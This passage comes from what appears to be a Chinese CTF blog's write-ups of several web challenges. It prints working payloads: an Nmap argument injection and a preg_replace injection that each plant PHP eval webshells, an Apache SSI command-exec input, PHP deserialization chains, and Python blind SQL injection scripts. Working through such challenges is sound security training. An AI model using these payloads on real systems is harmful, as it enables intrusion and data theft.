class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">3</span>;</span><br><span class="line"><span class="comment">//        system($get_flag);</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了空格还过滤了cat，但是也简单</p><p>构造payload</p><blockquote><p>?num=0x23333&amp;md5=0e215962017&amp;get_flag=base64%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag </p></blockquote><p>最后得到flag</p><blockquote><p>flag{9093578f-7506-4128-b9d0-e2c08aab5bcd}</p></blockquote><h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><h3 id="Nmap的命令使用"><a href="#Nmap的命令使用" class="headerlink" title="Nmap的命令使用"></a>Nmap的命令使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输出</span><br><span class="line">-oN       标准输出</span><br><span class="line">-oX       XMl输出</span><br><span class="line">-oS       script jlddi3</span><br><span class="line">-oG       grepable</span><br><span class="line">-oA       同时输出三种主要格式</span><br></pre></td></tr></table></figure><p>构造payload</p><blockquote><p>127.0.0.1 ‘ -oN b.phtml &lt;?=eval($_POST[a]);?&gt;’</p></blockquote><p>可以传一个马上去，然后post命令注入</p><p>最后得到flag</p><blockquote><p>flag{5ba50035-1b24-49c0-86a1-57d28288c511}</p></blockquote><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>明示阴间题？</p><p><img src="https://i.loli.net/2021/04/24/r7DcNFXlEPRIyas.png"></p><p>查看源代码发现一个/time.php?source</p><h3 id="反序列化-php函数拼接"><a href="#反序列化-php函数拼接" class="headerlink" title="反序列化+php函数拼接"></a>反序列化+php函数拼接</h3><p>题目给出代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>; <span class="comment">//参数</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>; <span class="comment">//data函数名</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>); <span class="comment">//拼接构造 =&gt; data(Y-m-d h:i:s)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]); <span class="comment">//反序列化</span></span><br></pre></td></tr></table></figure><p>查了好久怎么绕__construct，结果最后发现其实根本不需要绕_(¦3」∠)_</p><p>构造payload试试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现没啥用，应该是system被ban了，试试assert</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功进到了phpinfo()，然后直接查找flag就可以了</p><p>最后得到flag</p><blockquote><p> flag{63ff34b3-4698-48c7-8d82-19be438a88f3}</p></blockquote><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>试了试啥东西都没找到，最后试试扫目录，最后拿到个<code>index.php.swp</code></p><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>))</span><br></pre></td></tr></table></figure><p>这里我们知道需要得到一个password是md5编码后的前六位与admin参数值相等才能进去if</p><p>用脚本跑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    md5 = hashlib.md5(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    md6 = md5[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">    <span class="keyword">if</span> md6 == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>得到一串密码<code>2020666</code>，成功登入</p><p>但是啥都没有，查看http协议头</p><p>发现一个<code>Url_is_here: public/5c1e27af103c53033f640c42098db9a537470926.shtml</code></p><p>这里通过之前的代码我们可以知道这一串是随机生成的hash作为文件名，然后把密码啊存进去</p><h3 id="Apache-SSI远程命令执行"><a href="#Apache-SSI远程命令执行" class="headerlink" title="Apache SSI远程命令执行"></a>Apache SSI远程命令执行</h3><p><a href="https://www.cnblogs.com/yuzly/p/11226439.html">原理在这</a>，重新输入一下username进行命令执行</p><blockquote><p>username=<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"-->&amp;password=2020666</p></blockquote><p>得到flag</p><blockquote><p> flag{555f614a-6cb7-4175-be3c-8cf0205ace8d}</p></blockquote><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><h3 id="伪协议传输流截取"><a href="#伪协议传输流截取" class="headerlink" title="伪协议传输流截取"></a>伪协议传输流截取</h3><p>代码审计是要绕过一个if</p><blockquote><p>if(isset($text)&amp;&amp;(file_get_contents($text,’r’)===”I have a dream”))</p></blockquote><p>用伪协议来截取一下传输流</p><blockquote><p>text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=</p></blockquote><p>然后需要拿到next.php，继续用伪协议</p><blockquote><p>text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/convert.base64-encode/resource=next.php</p></blockquote><p>然后base64解码，得到一串源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里下面那两个函数都没啥用，我们直接看上面的complex函数</p><h3 id="preg-replace命令执行"><a href="#preg-replace命令执行" class="headerlink" title="preg_replace命令执行"></a>preg_replace命令执行</h3><p><a href="https://xz.aliyun.com/t/2557">原理在这</a>，构造paoload</p><blockquote><p>?\S*={${phpinfo()}}</p></blockquote><p>成功执行了phpinfo()函数，构造一个马进去</p><blockquote><p>?\S*=${eval($_POST[cmd])}</p></blockquote><p>然后命令注入</p><blockquote><p>cmd=system(‘cat /flag’);</p></blockquote><p>得到flag</p><blockquote><p>flag{73039dca-6653-471d-ac00-e08082493c44}</p></blockquote><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>SQL盲注，不多说，直接上脚本</p><p>爆表名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://913ec15c-c8c0-471b-a52a-b9284ba0af77.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">        sql = <span class="string">f&quot;?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),<span class="subst">&#123;x&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>)^1&quot;</span></span><br><span class="line">        result = requests.get(url + sql)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="comment"># print(f&quot;left now is: &#123;left&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># print(f&quot;right now is: &#123;right&#125;&quot;)</span></span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">    print(<span class="string">f&quot;result now is: <span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>爆列名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://913ec15c-c8c0-471b-a52a-b9284ba0af77.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">        sql = <span class="string">f&quot;?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),<span class="subst">&#123;x&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>)^1&quot;</span></span><br><span class="line">        result = requests.get(url + sql)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="comment"># print(f&quot;left now is: &#123;left&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># print(f&quot;right now is: &#123;right&#125;&quot;)</span></span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">    print(<span class="string">f&quot;result now is: <span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>爆数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://913ec15c-c8c0-471b-a52a-b9284ba0af77.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">        sql = <span class="string">f&quot;?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),<span class="subst">&#123;x&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>)^1&quot;</span></span><br><span class="line">        result = requests.get(url + sql)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="comment"># print(f&quot;left now is: &#123;left&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># print(f&quot;right now is: &#123;right&#125;&quot;)</span></span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">    print(<span class="string">f&quot;result now is: <span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到flag</p><blockquote><p>flag{c3b4b1f9-2515-4cf0-af08-2ca189dc3f38}</p></blockquote><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><h3 id="反序列化链"><a href="#反序列化链" class="headerlink" title="反序列化链"></a>反序列化链</h3><p>题目给出了很长的一串php代码，可以看出是一道反序列化题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 题目中出现的反序列化方法</span></span><br><span class="line">__construct   当一个对象创建时被调用，</span><br><span class="line">__toString   当一个对象被当作一个字符串被调用。</span><br><span class="line">__wakeup()   使用unserialize时触发</span><br><span class="line">__get()    用于从不可访问的属性读取数据</span><br><span class="line"><span class="comment">// 难以访问包括：（1）私有属性，（2）没有初始化的属性</span></span><br><span class="line">__invoke()   当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><p>我们看一下代码，先看看第一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>); <span class="comment">// include函数包含文件，这里应该是拿flag的地方，并且题目已经给出了flag在flag.php中</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123; <span class="comment">// __invoke魔术方法，具体看上面</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123; <span class="comment">// __construct魔术方法，创建类时自动调用</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123; <span class="comment">// __toString魔术方法，上面的echo 把source对象当作字符串调用了，于是会触发这个魔术方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source; <span class="comment">// 访问了$str里的source</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; <span class="comment">// 调用unserialize函数时自动触发</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123; <span class="comment">// 这里过滤了一些东西，但是没有过滤filter伪协议</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123; <span class="comment">// __get魔术方法，具体看上面</span></span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>(); <span class="comment">// 这里很显然的可以用来调用第一个类中的__invoke魔术方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果当第二个里的<code>$str=new Test()</code>，而Test类中又没有source，于是可以触发__get()魔术方法，然后我们只需要使<code>$p=new Modifier()</code>，就又可以触发__invoke()魔术方法，最后我们只要使Modifier里的var为我们要读取的flag.php即可。</p><p>所以payload可以为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span>-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//echo 